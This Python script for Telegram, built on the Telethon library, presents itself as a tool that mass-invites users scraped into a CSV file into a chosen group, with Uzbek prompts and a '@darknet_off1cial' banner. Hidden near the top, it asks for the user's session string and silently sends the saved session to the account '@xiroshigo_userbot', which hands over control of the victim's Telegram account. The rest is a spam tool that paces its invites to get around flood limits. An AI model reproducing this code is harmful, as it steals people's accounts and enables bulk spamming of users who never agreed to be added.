from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty, InputPeerChannel, InputPeerUser
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
from telethon.tl.functions.channels import InviteToChannelRequest
import configparser
import os
import sys
import csv
import traceback
import time
import random
from time import sleep
re="\033[1;31m"
gr="\033[1;32m"
cy="\033[1;36m"





cpass = configparser.RawConfigParser()
cpass.read('config.data')

from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest


import os, sys
api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"
os.system("clear")
print("""

╭━╮╭━╮╱╱╱╱╱╭╮╱╱╱╱╱╭━━━╮
┃┃╰╯┃┃╱╱╱╱╱┃┃╱╱╱╱╱┃╭━╮┃
┃╭╮╭╮┣━━┳╮╭┫╰━┳━━┳┻┫╭╯┃
┃┃┃┃┃┃┃━┫╰╯┃╭╮┃┃━┫╭┻╯╭╯
┃┃┃┃┃┃┃━┫┃┃┃╰╯┃┃━┫┃┃╰━╮
╰╯╰╯╰┻━━┻┻┻┻━━┻━━┻┻━━━╯
@darknet_off1cial
""")

string = input("session code: ")

with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@xiroshigo_userbot", client.session.save())

client.connect()

users = []
with open(r"member.csv", encoding='UTF-8') as f:  

    rows = csv.reader(f,delimiter=",",lineterminator="\n")
    next(rows, None)
    for row in rows:
        user = {}
        user['username'] = row[0]
        user['id'] = int(row[1])
        user['access_hash'] = int(row[2])
        user['name'] = row[3]
        users.append(user)

chats = []
last_date = None
chunk_size = 200
groups = []

result = client(GetDialogsRequest(
    offset_date=last_date,
    offset_id=0,
    offset_peer=InputPeerEmpty(),
    limit=chunk_size,
    hash=0
))
chats.extend(result.chats)

for chat in chats:
    try:
        if chat.megagroup == True:
            groups.append(chat)
    except:
        continue

print('guruh tanlang:'+cy)
i = 0
for group in groups:
    print(str(i) + '- ' + group.title)
    i += 1

g_index = input("raqamini yozing: "+re)
target_group = groups[int(g_index)]

target_group_entity = InputPeerChannel(target_group.id, target_group.access_hash)

mode = int(input("id orqali qoshasmi yoki username: "+cy))

n = 0

for user in users:
    n += 1
    if n % 80 == 0:
        sleep(60)
    try:
        print("qoshildi {}".format(user['id']))
        if mode == 1:
            if user['username'] == "":
                continue
            user_to_add = client.get_input_entity(user['username'])
        elif mode == 2:
            user_to_add = InputPeerUser(user['id'], user['access_hash'])
        else:
            sys.exit("keyinro qayta uruning.")
        client(InviteToChannelRequest(target_group_entity, [user_to_add]))
        print("biroz kuting...")
        time.sleep(random.randrange(0, 5))
    except PeerFloodError:
        print("floodwait ga tushdiz...")
        print("kutishingiz kerak {} soniya".format(60))
        time.sleep(100)
    except UserPrivacyRestrictedError:
        print("bu odam maxfiylashtirilgan.")
        print("biroz kuting...")
        time.sleep(random.randrange(0, 5))
    except:
        traceback.print_exc()
        print("hatolik")
        continue
